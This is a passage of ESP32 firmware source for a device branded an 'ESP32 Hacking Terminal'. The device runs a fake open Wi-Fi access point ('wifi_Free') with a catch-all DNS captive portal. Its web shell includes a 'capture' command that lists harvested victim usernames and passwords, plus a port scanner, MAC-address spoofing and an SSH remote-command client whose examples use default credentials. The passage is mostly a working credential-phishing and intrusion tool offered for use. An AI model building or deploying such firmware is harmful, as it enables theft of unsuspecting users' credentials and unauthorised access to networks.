  if(e.key==='Enter'){e.preventDefault();sendCmd();return;}
  if(e.key==='ArrowUp'){e.preventDefault();if(hIdx<hist.length-1){hIdx++;inp.value=hist[hIdx];}return;}
  if(e.key==='ArrowDown'){e.preventDefault();if(hIdx>0){hIdx--;inp.value=hist[hIdx];}else{hIdx=-1;inp.value='';}return;}
  if(e.key==='Tab'){
    e.preventDefault();var v=inp.value.trim().toLowerCase();if(!v)return;
    var m=cmds.filter(function(c){return c.indexOf(v)===0;});
    if(m.length===1)inp.value=m[0]+' ';
    else if(m.length>1){addLine('root@bellwether:~$ '+v,'cmd');addLine(m.join('  '),'info');}
  }
  if(e.ctrlKey&&e.key==='l'){e.preventDefault();term.innerHTML='';return;}
  if(e.ctrlKey&&e.key==='c'){e.preventDefault();inp.value='';addLine('^C','err');return;}
});

// ====== WiFi ======
var selSSID='';
var wifiRetry=0;
function signalIcon(r){return r>-50?'###':r>-70?'## ':r>-85?'#  ':'_  ';}
function checkWifi(){
  var x=new XMLHttpRequest();x.open('GET','/api/wifi-status',true);x.timeout=5000;
  x.ontimeout=x.onerror=function(){
    wifiRetry++;
    var st=document.getElementById('wifiSt');
    if(st){st.className='wifi-status off';st.innerHTML='Reconectando... ('+wifiRetry+') <br><small>AP: 8.8.4.4 | Aguarde...</small>';}
    setTimeout(checkWifi,3000);
  };
  x.onreadystatechange=function(){
    if(x.readyState===4&&x.status===200){
      wifiRetry=0;
      var d=JSON.parse(x.responseText);
      var st=document.getElementById('wifiSt');
      var ac=document.getElementById('wifiActions');
      if(d.connecting){
        st.className='wifi-status on';
        st.innerHTML='Conectando em <b>'+d.ssid+'</b>... ('+d.elapsed+'s)';
        ac.innerHTML='';
        setTimeout(checkWifi,2000);
      }else if(d.connected){
        st.className='wifi-status on';
        st.innerHTML='Conectado: <b>'+d.ssid+'</b><br>IP STA: '+d.ip+' | RSSI: '+d.rssi+'dBm';
        ac.innerHTML='<button class="scan-btn" onclick="showTab(1)">Ir para Terminal</button> <button class="disconnect-btn" onclick="disconnectWifi()">Desconectar</button>';
        var cb=document.getElementById('connBtn');if(cb){cb.disabled=false;cb.textContent='Conectar';}
        var msg=document.getElementById('wifiMsg');if(msg)msg.innerHTML='<div class="msg ok">Conectado! curl e ping agora usam a internet.</div>';
      }else{
        st.className='wifi-status off';st.textContent='Desconectado';ac.innerHTML='';
        var cb=document.getElementById('connBtn');if(cb){cb.disabled=false;cb.textContent='Conectar';}
      }
    }
  };x.send();
}

function scanWifi(){
  var b=document.getElementById('scanBtn');b.disabled=true;b.textContent='Escaneando...';
  document.getElementById('netList').innerHTML='';
  document.getElementById('passRow').style.display='none';selSSID='';
  var x=new XMLHttpRequest();x.open('GET','/api/scan',true);
  x.onreadystatechange=function(){
    if(x.readyState===4){
      b.disabled=false;b.textContent='Escanear Redes';
      if(x.status===200){
        var nets=JSON.parse(x.responseText);
        var nl=document.getElementById('netList');nl.innerHTML='';
        if(nets.length===0){nl.innerHTML='<div class="empty">Nenhuma rede encontrada</div>';return;}
        nets.forEach(function(n){
          var d=document.createElement('div');d.className='net-item';
          d.innerHTML='<span class="ssid">'+n.ssid+'</span><span class="meta">'+n.enc+' | Ch'+n.ch+' | <span class="signal">'+signalIcon(n.rssi)+'</span> '+n.rssi+'dBm</span>';
          d.onclick=function(){
            document.querySelectorAll('.net-item').forEach(function(e){e.classList.remove('selected');});
            d.classList.add('selected');selSSID=n.ssid;
            document.getElementById('passRow').style.display=n.enc==='OPEN'?'none':'flex';
            document.getElementById('wifiPass').value='';
          };
          nl.appendChild(d);
        });
      }
    }
  };x.timeout=15000;x.ontimeout=function(){b.disabled=false;b.textContent='Escanear Redes';};x.send();
}

function connectWifi(){
  if(!selSSID)return;
  var cb=document.getElementById('connBtn');cb.disabled=true;cb.textContent='Conectando...';
  var msg=document.getElementById('wifiMsg');msg.innerHTML='<div class="msg ok">Conectando em '+selSSID+'... Aguarde ate 20s</div>';
  var p=document.getElementById('wifiPass').value;
  var x=new XMLHttpRequest();x.open('POST','/api/connect',true);
  x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
  x.onreadystatechange=function(){
    if(x.readyState===4){
      if(x.status===200){
        // Server accepted, start polling status
        setTimeout(checkWifi,3000);
      }else{
        cb.disabled=false;cb.textContent='Conectar';
        msg.innerHTML='<div class="msg fail">Erro HTTP '+x.status+'</div>';
      }
    }
  };
  x.timeout=10000;x.ontimeout=function(){
    // Even on timeout, connection might be proceeding in background
    setTimeout(checkWifi,2000);
  };
  x.send('ssid='+encodeURIComponent(selSSID)+'&pass='+encodeURIComponent(p));
}

function disconnectWifi(){
  var x=new XMLHttpRequest();x.open('POST','/api/wifi-disconnect',true);
  x.onreadystatechange=function(){if(x.readyState===4)checkWifi();};x.send();
}

checkWifi();
</script>
</body>
</html>)rawliteral";

  webServer.send(200, "text/html", page);
}

void portalHandleLogout() {
  adminLogado = false;
  webServer.sendHeader("Location", "/aula");
  webServer.send(302, "text/plain", "Deslogado");
}

// ========== TERMINAL INTERATIVO — SHELL BELLWETHER ==========

String getUptime() {
  unsigned long s = millis() / 1000;
  int d = s / 86400; s %= 86400;
  int h = s / 3600; s %= 3600;
  int m = s / 60; s %= 60;
  String r = "";
  if (d > 0) r += String(d) + "d ";
  if (h > 0) r += String(h) + "h ";
  if (m > 0) r += String(m) + "m ";
  r += String((int)s) + "s";
  return r;
}

String processCommand(String cmd) {
  cmd.trim();
  if (cmd.length() == 0) return "";
  if (cmd.length() > 200) return "bash: input too long (max 200)";

  // Parse command and args
  String base = cmd;
  String args = "";
  int sp = cmd.indexOf(' ');
  if (sp > 0) {
    base = cmd.substring(0, sp);
    args = cmd.substring(sp + 1);
    args.trim();
  }
  base.toLowerCase();

  // ==================== help / --help ====================
  if (base == "help" || base == "--help" || cmd == "?") {
    return "Bellwether Shell v1.0 — ESP32 Hacking Terminal\n"
           "\n"
           "COMANDOS DISPONIVEIS:\n"
           "  help, --help         Mostra esta ajuda\n"
           "  clear                Limpa o terminal\n"
           "  whoami               Usuario logado\n"
           "  hostname             Nome do dispositivo\n"
           "  uname [-a]           Info do sistema\n"
           "  uptime               Tempo ligado\n"
           "  free                 Memoria livre\n"
           "  df                   Uso de flash\n"
           "  ps                   Processos (tasks)\n"
           "  reboot               Reinicia ESP32\n"
           "\n"
           "REDE:\n"
           "  ifconfig             Interfaces de rede\n"
           "  iwconfig             Info wireless\n"
           "  iwlist scan          Escaneia redes WiFi\n"
           "  nmcli con SSID PASS  Conecta em rede WiFi\n"
           "  nmcli disconnect     Desconecta WiFi STA\n"
           "  ping HOST [-c N]     Ping TCP (default 4)\n"
           "  nmap HOST            Scan portas comuns\n"
           "  arp                  Clientes no AP\n"
           "  netstat              Conexoes ativas\n"
           "\n"
           "SEGURANCA:\n"
           "  macchanger -r        Randomiza MAC\n"
           "  macchanger -p        Restaura MAC original\n"
           "  macchanger -s        Mostra MAC atual\n"
           "  ssh user@host -pw P -c CMD  Executa comando via SSH\n"
           "  curl URL [-I]        Requisicao HTTP/HTTPS\n"
           "  capture --list       Lista credenciais\n"
           "  capture --clear      Limpa capturas\n"
           "  capture --count      Total de capturas\n"
           "\n"
           "Use COMANDO --help para ajuda especifica.";
  }

  // ==================== clear ====================
  if (base == "clear" || base == "cls") {
    return "\x01CLEAR\x01";  // signal para o JS limpar
  }

  // ==================== whoami ====================
  if (base == "whoami") {
    if (args == "--help") return "whoami: mostra o usuario logado no painel admin";
    return "root@bellwether";
  }

  // ==================== hostname ====================
  if (base == "hostname") {
    if (args == "--help") return "hostname: mostra o nome do dispositivo ESP32";
    return "bellwether";
  }

  // ==================== uname ====================
  if (base == "uname") {
    if (args == "--help") return "uname [OPCAO]\n  -a    todas as informacoes\n  -r    versao do kernel\n  -m    arquitetura\n  -s    nome do sistema";
    if (args == "-a" || args == "-all") {
      return "BellwetherOS " + String(ESP.getChipModel()) + " " + String(ESP.getCpuFreqMHz()) + "MHz ESP-IDF " + String(ESP.getSdkVersion()) + " xtensa-esp32";
    }
    if (args == "-r") return String(ESP.getSdkVersion());
    if (args == "-m") return "xtensa-esp32";
    if (args == "-s") return "BellwetherOS";
    return "BellwetherOS";
  }

  // ==================== uptime ====================
  if (base == "uptime") {
    if (args == "--help") return "uptime: mostra tempo desde o boot";
    return " " + getUptime() + " up, load: " + String(100 - (ESP.getFreeHeap() * 100 / 327680)) + "%";
  }

  // ==================== free ====================
  if (base == "free") {
    if (args == "--help") return "free [-h]\n  -h    formato legivel\n\nMostra uso de memoria RAM (heap)";
    unsigned long total = 327680;
    unsigned long livre = ESP.getFreeHeap();
    unsigned long usado = total - livre;
    unsigned long minL = ESP.getMinFreeHeap();
    if (args == "-h") {
      return "              total     usado     livre     min-livre\n"
             "Heap:     " + String(total/1024) + "KB    " + String(usado/1024) + "KB    " + String(livre/1024) + "KB    " + String(minL/1024) + "KB";
    }
    return "              total       usado       livre     min-livre\n"
           "Heap:     " + String(total) + "   " + String(usado) + "   " + String(livre) + "   " + String(minL);
  }

  // ==================== df ====================
  if (base == "df") {
    if (args == "--help") return "df [-h]\n  -h    formato legivel\n\nMostra uso de armazenamento flash";
    unsigned long total = ESP.getFlashChipSize();
    unsigned long sketch = ESP.getSketchSize();
    unsigned long livre = ESP.getFreeSketchSpace();
    if (args == "-h") {
      return "Sistema de arquivos     Tam     Usado    Disp    Uso%\n"
             "/dev/flash              " + String(total/1024) + "K   " + String(sketch/1024) + "K   " + String(livre/1024) + "K   " + String(sketch*100/total) + "%";
    }
    return "Sistema de arquivos     Tamanho     Usado       Disp\n"
           "/dev/flash              " + String(total) + "   " + String(sketch) + "   " + String(livre);
  }

  // ==================== ps ====================
  if (base == "ps") {
    if (args == "--help") return "ps: lista processos (FreeRTOS tasks) ativos";
    return "  PID  CORE  NOME            ESTADO\n"
           "    1     1  main_loop       RUNNING\n"
           "    2     0  portal_task     RUNNING\n"
           "    3     0  IDLE0           READY\n"
           "    4     1  IDLE1           READY\n"
           "    5     0  wifi            RUNNING\n"
           "    6     1  loopback        READY";
  }

  // ==================== reboot ====================
  if (base == "reboot" || base == "restart") {
    if (args == "--help") return "reboot: reinicia o ESP32 imediatamente";
    webServer.send(200, "text/plain", "Sistema reiniciando...\nConexao sera perdida.");
    delay(500);
    ESP.restart();
    return "";
  }

  // ==================== ifconfig ====================
  if (base == "ifconfig") {
    if (args == "--help") return "ifconfig: mostra configuracao das interfaces de rede\n\nExibe IP, MAC, mascara e gateway de todas as interfaces";
    uint8_t mac[6];
    esp_wifi_get_mac(WIFI_IF_AP, mac);
    String r = "ap0: flags=4163<UP,BROADCAST,RUNNING>\n";
    r += "      inet " + WiFi.softAPIP().toString() + "  netmask 255.255.255.0\n";
    char macStr[24];
    sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
    r += "      ether " + String(macStr) + "\n";
    r += "      ssid: wifi_Free  clients: " + String(WiFi.softAPgetStationNum()) + "\n\n";

    esp_wifi_get_mac(WIFI_IF_STA, mac);
    sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
    if (WiFi.status() == WL_CONNECTED) {
      r += "wlan0: flags=4163<UP,BROADCAST,RUNNING>\n";
      r += "      inet " + WiFi.localIP().toString() + "  netmask " + WiFi.subnetMask().toString() + "\n";
      r += "      gateway " + WiFi.gatewayIP().toString() + "  dns " + WiFi.dnsIP().toString() + "\n";
      r += "      ether " + String(macStr) + "\n";
      r += "      ssid: " + WiFi.SSID();
    } else {
      r += "wlan0: flags=4098<BROADCAST,DOWN>\n";
      r += "      ether " + String(macStr) + "\n";
      r += "      NO CARRIER";
    }
    return r;
  }

  // ==================== iwconfig ====================
  if (base == "iwconfig") {
    if (args == "--help") return "iwconfig: mostra info wireless detalhada";
    String r = "ap0     IEEE 802.11bgn  ESSID:\"wifi_Free\"\n";
    r += "        Mode:Master  Frequency:2.4GHz\n";
    r += "        Clients:" + String(WiFi.softAPgetStationNum()) + "  Tx-Power:20dBm\n\n";
    if (WiFi.status() == WL_CONNECTED) {
      r += "wlan0   IEEE 802.11bgn  ESSID:\"" + WiFi.SSID() + "\"\n";
      r += "        Mode:Managed  Frequency:2.4GHz  Channel:" + String(WiFi.channel()) + "\n";
      r += "        Signal:" + String(WiFi.RSSI()) + "dBm  Tx-Power:20dBm";
    } else {
      r += "wlan0   IEEE 802.11bgn  ESSID:off/any\n";
      r += "        Mode:Managed  Access Point: Not-Associated";
    }
    return r;
  }

  // ==================== iwlist scan ====================
  if (base == "iwlist") {
    if (args == "--help") return "iwlist scan: escaneia e lista redes WiFi disponiveis\n  Mostra SSID, sinal (dBm), canal e criptografia";
    if (args != "scan") return "iwlist: opcao invalida '" + args + "'\nUse: iwlist scan";
    int n = WiFi.scanNetworks();
    if (n == 0) return "wlan0     Scan completed: 0 networks found";
    String r = "wlan0     Scan completed: " + String(n) + " networks\n";
    int show = min(n, 20);
    for (int i = 0; i < show; i++) {
      r += "  Cell " + String(i+1<10?"0":"") + String(i+1) + " - ESSID:\"" + WiFi.SSID(i) + "\"\n";
      r += "          Channel:" + String(WiFi.channel(i)) + "  Signal:" + String(WiFi.RSSI(i)) + "dBm  ";
      switch (WiFi.encryptionType(i)) {
        case WIFI_AUTH_OPEN: r += "Enc:OPEN"; break;
        case WIFI_AUTH_WPA_PSK: r += "Enc:WPA/PSK"; break;
        case WIFI_AUTH_WPA2_PSK: r += "Enc:WPA2/PSK"; break;
        case WIFI_AUTH_WPA_WPA2_PSK: r += "Enc:WPA/WPA2"; break;
        case WIFI_AUTH_WPA2_ENTERPRISE: r += "Enc:WPA2-ENT"; break;
        default: r += "Enc:ENCRYPTED"; break;
      }
      r += "\n";
    }
    WiFi.scanDelete();
    return r;
  }

  // ==================== nmcli ====================
  if (base == "nmcli") {
    if (args == "--help") return "nmcli: controle de conexao WiFi\n\n  nmcli con SSID SENHA   Conecta em rede WiFi\n  nmcli disconnect       Desconecta STA\n  nmcli status           Status da conexao";
    if (args == "disconnect" || args == "dis") {
      WiFi.disconnect(true);
      delay(100);
      WiFi.mode(WIFI_AP);
      delay(200);
      setDefaultRoute(false);
      dnsServer.start(53, "*", IPAddress(8,8,4,4));
      return "Dispositivo 'wlan0' desconectado.\nModo AP restaurado.";
    }
    if (args == "status") {
      if (WiFi.status() == WL_CONNECTED) {
        return "wlan0: conectado em \"" + WiFi.SSID() + "\"\n"
               "  inet: " + WiFi.localIP().toString() + "\n"
               "  signal: " + String(WiFi.RSSI()) + " dBm";
      }
      return "wlan0: desconectado";
    }
    if (args.startsWith("con ") || args.startsWith("connect ")) {
      String a = args.startsWith("con ") ? args.substring(4) : args.substring(8);
      a.trim();
      int s2 = a.indexOf(' ');
      if (s2 < 1) return "Uso: nmcli con SSID SENHA";
      String ssid = a.substring(0, s2);
      String pass = a.substring(s2 + 1);
      ssid.trim(); pass.trim();
      if (ssid.length() == 0 || ssid.length() > 32) return "nmcli: SSID invalido (1-32 chars)";
      if (pass.length() < 8 || pass.length() > 63) return "nmcli: senha invalida (8-63 chars)";

      dnsServer.stop();
      WiFi.mode(WIFI_AP_STA);
      delay(100);
      WiFi.begin(ssid.c_str(), pass.c_str());
      String r = "Ativando conexao 'wlan0' em \"" + ssid + "\"...\n";
      unsigned long t = millis();
      while (WiFi.status() != WL_CONNECTED && millis() - t < 15000) {
        delay(500);
      }
      if (WiFi.status() == WL_CONNECTED) {
        // Set STA as default route so packets reach the internet
        setDefaultRoute(true);
        // Restart DNS for captive portal clients
        dnsServer.stop();
        dnsServer.start(53, "*", IPAddress(8,8,4,4));
        r += "Conexao ativada com sucesso.\n";
        r += "  inet: " + WiFi.localIP().toString() + "\n";
        r += "  gateway: " + WiFi.gatewayIP().toString() + "\n";
        r += "  dns: " + WiFi.dnsIP().toString();
        return r;
      }
      WiFi.disconnect();
      delay(100);
      WiFi.mode(WIFI_AP);
      delay(200);
      setDefaultRoute(false);
      dnsServer.start(53, "*", IPAddress(8,8,4,4));
      return r + "Erro: falha na ativacao (timeout 15s).\nVerifique SSID e senha.";
    }
    return "nmcli: comando invalido.\nUse: nmcli --help";
  }

  // ==================== ping ====================
  if (base == "ping") {
    if (args == "--help") return "ping [OPCOES] HOST\n\n  -c N     numero de pings (default 4)\n  -p PORT  porta TCP (default 80)\n\nExemplos:\n  ping 8.8.8.8\n  ping -c 8 google.com\n  ping -p 443 1.1.1.1";
    if (args.length() == 0) return "ping: faltando operando\nUse: ping HOST ou ping --help";
    ensureSTARoute();

    int count = 4;
    int port = 80;
    String host = args;

    // parse -c N
    if (host.indexOf("-c ") >= 0) {
      int ci = host.indexOf("-c ");
      String cval = host.substring(ci + 3);
      int csp = cval.indexOf(' ');
      if (csp > 0) {
        count = cval.substring(0, csp).toInt();
        host = host.substring(0, ci) + cval.substring(csp + 1);
      } else {
        return "ping: opcao -c requer um numero e um host";
      }
    }
    // parse -p PORT
    if (host.indexOf("-p ") >= 0) {
      int pi = host.indexOf("-p ");
      String pval = host.substring(pi + 3);
      int psp = pval.indexOf(' ');
      if (psp > 0) {
        port = pval.substring(0, psp).toInt();
        host = host.substring(0, pi) + pval.substring(psp + 1);
      } else {
        return "ping: opcao -p requer uma porta e um host";
      }
    }
    host.trim();
    if (count < 1) count = 1;
    if (count > 20) count = 20;
    if (port < 1 || port > 65535) return "ping: porta invalida";
    if (host.length() == 0 || host.length() > 63) return "ping: host invalido";

    IPAddress ip;
    bool isIP = ip.fromString(host);
    if (!isIP && WiFi.status() != WL_CONNECTED) return "ping: rede inacessivel - conecte com nmcli primeiro";

    String r = "PING " + host + " (" + (isIP ? host : "resolving") + ") porta " + String(port) + "\n";
    int ok = 0;
    unsigned long totalMs = 0;
    unsigned long minMs = 99999, maxMs = 0;
    for (int i = 0; i < count; i++) {
      WiFiClient c;
      unsigned long t1 = millis();
      bool con = isIP ? c.connect(ip, port, 3000) : c.connect(host.c_str(), port, 3000);
      unsigned long dt = millis() - t1;
      c.stop();
      if (con) {
        r += "Resposta de " + host + ":" + String(port) + " tempo=" + String(dt) + "ms\n";
        ok++;
        totalMs += dt;
        if (dt < minMs) minMs = dt;
        if (dt > maxMs) maxMs = dt;
      } else {
        r += "Tempo esgotado para " + host + ":" + String(port) + "\n";
      }
    }
    r += "--- " + host + " estatisticas ---\n";
    r += String(count) + " pacotes transmitidos, " + String(ok) + " recebidos, " + String((count-ok)*100/count) + "% perda\n";
    if (ok > 0) {
      r += "rtt min/avg/max = " + String(minMs) + "/" + String(totalMs/ok) + "/" + String(maxMs) + " ms";
    }
    return r;
  }

  // ==================== nmap ====================
  if (base == "nmap") {
    if (args == "--help") return "nmap HOST\n\nEscaneia portas comuns no host alvo.\nPortas: 21,22,23,53,80,443,445,3389,8080,8443\n\nExemplo:\n  nmap 192.168.4.1\n  nmap gateway";
    if (args.length() == 0) return "nmap: faltando host alvo\nUse: nmap HOST ou nmap --help";
    ensureSTARoute();

    String host = args;
    host.trim();
    if (host == "gateway" || host == "gw") {
      host = WiFi.gatewayIP().toString();
    }

    IPAddress ip;
    bool isIP = ip.fromString(host);
    if (!isIP && WiFi.status() != WL_CONNECTED) return "nmap: rede inacessivel";

    int ports[] = {21, 22, 23, 53, 80, 443, 445, 3389, 8080, 8443};
    const char* names[] = {"ftp","ssh","telnet","dns","http","https","smb","rdp","http-alt","https-alt"};
    String r = "Starting Nmap scan on " + host + "\n";
    r += "PORT      STATE    SERVICE\n";
    int openCount = 0;
    for (int i = 0; i < 10; i++) {
      WiFiClient c;
      bool con = isIP ? c.connect(ip, ports[i], 1000) : c.connect(host.c_str(), ports[i], 1000);
      c.stop();
      String pStr = String(ports[i]) + "/tcp";
      while (pStr.length() < 10) pStr += " ";
      r += pStr + (con ? "open     " : "closed   ") + names[i] + "\n";
      if (con) openCount++;
    }
    r += "\nNmap done: 1 host, " + String(openCount) + " open ports";
    return r;
  }

  // ==================== arp ====================
  if (base == "arp") {
    if (args == "--help") return "arp: mostra clientes conectados no Access Point";
    int n = WiFi.softAPgetStationNum();
    if (n == 0) return "arp: nenhum cliente conectado no AP";
    return "Clientes no AP (wifi_Free): " + String(n) + "\nInterface: ap0  IP: " + WiFi.softAPIP().toString();
  }

  // ==================== netstat ====================
  if (base == "netstat") {
    if (args == "--help") return "netstat: mostra conexoes de rede e portas abertas";
    String r = "Proto  Local Address        Estado\n";
    r += "tcp    " + WiFi.softAPIP().toString() + ":80     LISTEN  (httpd)\n";
    r += "udp    " + WiFi.softAPIP().toString() + ":53     LISTEN  (dns)\n";
    if (WiFi.status() == WL_CONNECTED) {
      r += "tcp    " + WiFi.localIP().toString() + ":*      ESTABLISHED (sta)\n";
    }
    r += "\nPortal: " + String(portalAtivo ? "ATIVO" : "INATIVO") + "  Capturas: " + String(numCapturas);
    return r;
  }

  // ==================== macchanger ====================
  if (base == "macchanger") {
    if (args == "--help" || args.length() == 0) return "macchanger [OPCAO]\n\n  -s    mostra MAC atual\n  -r    randomiza MAC (locally administered)\n  -p    restaura MAC permanente (de fabrica)\n\nExemplo:\n  macchanger -r";
    if (args == "-s" || args == "--show") {
      uint8_t m[6];
      esp_wifi_get_mac(WIFI_IF_STA, m);
      char buf[64];
      sprintf(buf, "Current MAC: %02X:%02X:%02X:%02X:%02X:%02X (wlan0)", m[0],m[1],m[2],m[3],m[4],m[5]);
      return String(buf);
    }
    if (args == "-r" || args == "--random") {
      uint8_t old[6], nw[6];
      esp_wifi_get_mac(WIFI_IF_STA, old);
      for (int i = 0; i < 6; i++) nw[i] = random(0, 256);
      nw[0] = (nw[0] & 0xFE) | 0x02;
      esp_wifi_set_mac(WIFI_IF_STA, nw);
      char buf[120];
      sprintf(buf, "Current: %02X:%02X:%02X:%02X:%02X:%02X\nFaked:   %02X:%02X:%02X:%02X:%02X:%02X",
        old[0],old[1],old[2],old[3],old[4],old[5],
        nw[0],nw[1],nw[2],nw[3],nw[4],nw[5]);
      return String(buf);
    }
    if (args == "-p" || args == "--permanent") {
      uint8_t old[6], orig[6];
      esp_wifi_get_mac(WIFI_IF_STA, old);
      esp_efuse_mac_get_default(orig);
      esp_wifi_set_mac(WIFI_IF_STA, orig);
      char buf[120];
      sprintf(buf, "Current:   %02X:%02X:%02X:%02X:%02X:%02X\nPermanent: %02X:%02X:%02X:%02X:%02X:%02X\nRestaurado.",
        old[0],old[1],old[2],old[3],old[4],old[5],
        orig[0],orig[1],orig[2],orig[3],orig[4],orig[5]);
      return String(buf);
    }
    return "macchanger: opcao invalida '" + args + "'\nUse: macchanger --help";
  }

  // ==================== capture ====================
  if (base == "capture") {
    if (args == "--help" || args.length() == 0) return "capture [OPCAO]\n\n  --list     lista todas as credenciais capturadas\n  --count    mostra total de capturas\n  --clear    limpa todas as capturas\n  --last     mostra ultima captura";
    if (args == "--list" || args == "-l") {
      if (numCapturas == 0) return "Nenhuma captura registrada.";
      String r = "=== Credenciais Capturadas (" + String(numCapturas) + ") ===\n";
      r += "  #   USUARIO                 SENHA\n";
      for (int i = 0; i < numCapturas; i++) {
        String idx = String(i+1);
        while (idx.length() < 3) idx = " " + idx;
        String usr = capturas[i].user;
        while (usr.length() < 24) usr += " ";
        r += "  " + idx + " " + usr + capturas[i].pass + "\n";
      }
      return r;
    }
    if (args == "--count" || args == "-c") {
      return "Capturas: " + String(numCapturas) + "/" + String(MAX_CAPTURES);
    }
    if (args == "--clear") {
      int old = numCapturas;
      numCapturas = 0;
      portalAttempts = 0;
      return "Limpas " + String(old) + " capturas. Total: 0";
    }
    if (args == "--last") {
      if (numCapturas == 0) return "Nenhuma captura.";
      return "Ultima: " + capturas[numCapturas-1].user + " / " + capturas[numCapturas-1].pass;
    }
    return "capture: opcao invalida '" + args + "'\nUse: capture --help";
  }

  // ==================== echo ====================
  if (base == "echo") {
    return args;
  }

  // ==================== date ====================
  if (base == "date") {
    return "Uptime: " + getUptime() + " (sem RTC/NTP)";
  }

  // ==================== cat ====================
  if (base == "cat") {
    if (args == "/etc/hostname") return "bellwether";
    if (args == "/etc/os-release") return "NAME=\"BellwetherOS\"\nVERSION=\"1.0\"\nID=bellwether\nPLATFORM=ESP32";
    if (args == "/proc/cpuinfo") return "processor: 0\nmodel: " + String(ESP.getChipModel()) + "\ncpu MHz: " + String(ESP.getCpuFreqMHz()) + "\ncores: 2";
    if (args == "/proc/meminfo") return "MemTotal: 320 kB\nMemFree: " + String(ESP.getFreeHeap()/1024) + " kB\nMemMin: " + String(ESP.getMinFreeHeap()/1024) + " kB";
    if (args == "/proc/version") return "BellwetherOS version 1.0 (xtensa-esp32) ESP-IDF " + String(ESP.getSdkVersion());
    return "cat: " + args + ": No such file or directory";
  }

  // ==================== ls ====================
  if (base == "ls") {
    if (args == "/" || args == "" || args == "-la" || args == "-l") {
      return "drwxr-xr-x  root  etc/\ndrwxr-xr-x  root  proc/\ndrwxr-xr-x  root  dev/\n-rwxr-xr-x  root  firmware.bin";
    }
    if (args == "/etc" || args == "-la /etc") return "-rw-r--r--  root  hostname\n-rw-r--r--  root  os-release";
    if (args == "/proc" || args == "-la /proc") return "-r--r--r--  root  cpuinfo\n-r--r--r--  root  meminfo\n-r--r--r--  root  version";
    return "ls: cannot access '" + args + "': No such file or directory";
  }

  // ==================== cd / pwd ====================
  if (base == "cd") return "";
  if (base == "pwd") return "/root";
  if (base == "id") return "uid=0(root) gid=0(root) groups=0(root)";
  if (base == "history") return "Use seta pra cima/baixo no terminal.";
  if (base == "exit" || base == "logout") return "Use o botao 'Sair' no menu.";
  if (base == "sudo") return "root@bellwether ja tem privilegios totais.";
  if (base == "rm" || base == "mkdir" || base == "touch" || base == "nano" || base == "vi" || base == "vim") return base + ": filesystem somente-leitura";
  if (base == "apt" || base == "apt-get" || base == "pacman" || base == "yum") return base + ": gerenciador de pacotes nao disponivel neste sistema";

  // ==================== diag ====================
  if (base == "diag") {
    String r = "=== DIAGNOSTICO DE REDE ===\n\n";
    r += "[Interfaces lwIP]\n";
    struct netif *nif = netif_list;
    int idx = 0;
    while (nif != NULL) {
      char name[8];
      snprintf(name, sizeof(name), "%c%c%d", nif->name[0], nif->name[1], nif->num);
      IPAddress ip(ip4_addr_get_u32(netif_ip4_addr(nif)));
      IPAddress mask(ip4_addr_get_u32(netif_ip4_netmask(nif)));
      IPAddress gw(ip4_addr_get_u32(netif_ip4_gw(nif)));
      bool isDefault = (nif == netif_default);
      bool isUp = netif_is_up(nif) && netif_is_link_up(nif);
      r += "  " + String(name) + ": " + ip.toString() + "/" + mask.toString();
      r += " gw=" + gw.toString();
      r += isUp ? " [UP]" : " [DOWN]";
      r += isDefault ? " <DEFAULT>" : "";
      r += "\n";
      nif = nif->next;
      idx++;
    }
    r += "\n[WiFi Status]\n";
    r += "  Mode: " + String(WiFi.getMode() == WIFI_AP ? "AP" : WiFi.getMode() == WIFI_AP_STA ? "AP+STA" : WiFi.getMode() == WIFI_STA ? "STA" : "OFF") + "\n";
    r += "  STA: " + String(WiFi.status() == WL_CONNECTED ? "connected" : "disconnected") + "\n";
    if (WiFi.status() == WL_CONNECTED) {
      r += "  STA IP: " + WiFi.localIP().toString() + "\n";
      r += "  STA GW: " + WiFi.gatewayIP().toString() + "\n";
      r += "  STA DNS: " + WiFi.dnsIP().toString() + "\n";
    }
    r += "  AP IP: " + WiFi.softAPIP().toString() + "\n";

    // Force STA as default
    if (WiFi.status() == WL_CONNECTED) {
      r += "\n[Forcando rota STA...]\n";
      setDefaultRoute(true);
      // verify
      nif = netif_list;
      while (nif != NULL) {
        if (nif == netif_default) {
          IPAddress defIP(ip4_addr_get_u32(netif_ip4_addr(nif)));
          r += "  Default netif agora: " + defIP.toString() + "\n";
          break;
        }
        nif = nif->next;
      }

      // Test gateway connectivity
      r += "\n[Teste TCP -> gateway " + WiFi.gatewayIP().toString() + ":80]\n";
      WiFiClient c;
      unsigned long t1 = millis();
      bool ok = c.connect(WiFi.gatewayIP(), 80, 3000);
      unsigned long dt = millis() - t1;
      c.stop();
      r += ok ? "  OK (" + String(dt) + "ms)\n" : "  FALHOU (" + String(dt) + "ms)\n";

      // Test external
      r += "\n[Teste TCP -> 1.1.1.1:80]\n";
      WiFiClient c2;
      t1 = millis();
      ok = c2.connect(IPAddress(1,1,1,1), 80, 5000);
      dt = millis() - t1;
      c2.stop();
      r += ok ? "  OK (" + String(dt) + "ms)\n" : "  FALHOU (" + String(dt) + "ms)\n";

      // Test DNS
      r += "\n[Teste DNS -> google.com]\n";
      IPAddress resolved;
      ok = WiFi.hostByName("google.com", resolved);
      r += ok ? "  OK -> " + resolved.toString() + "\n" : "  FALHOU\n";
    } else {
      r += "\nSTA nao conectado - conecte com nmcli ou aba WiFi primeiro";
    }
    return r;
  }

  // ==================== ssh ====================
  if (base == "ssh") {
    ensureSTARoute();
    if (args == "--help" || args.length() == 0) {
      return "ssh: cliente SSH (libssh)\n\n"
             "Uso:\n"
             "  ssh user@host -pw SENHA -c \"comando\"\n"
             "  ssh user@host -p PORT -pw SENHA -c CMD\n"
             "  ssh user@host -pw SENHA            (executa uname -a por padrao)\n\n"
             "Opcoes:\n"
             "  -p PORT    porta SSH (default 22)\n"
             "  -pw PASS   senha de autenticacao\n"
             "  -c CMD     comando para executar remoto\n\n"
             "Exemplos:\n"
             "  ssh root@192.168.1.1 -pw admin -c \"ls -la\"\n"
             "  ssh pi@10.0.0.5 -pw raspberry -c \"uname -a\"\n"
             "  ssh admin@host -p 2222 -pw pass -c \"whoami\"";
    }
    if (WiFi.status() != WL_CONNECTED) return "ssh: rede inacessivel - conecte com nmcli primeiro";

    String userHost = args;
    String sshUser = "", sshHost = "", sshPass = "", sshCmd = "";
    int sshPort = 22;

    int ci = args.indexOf(" -c ");
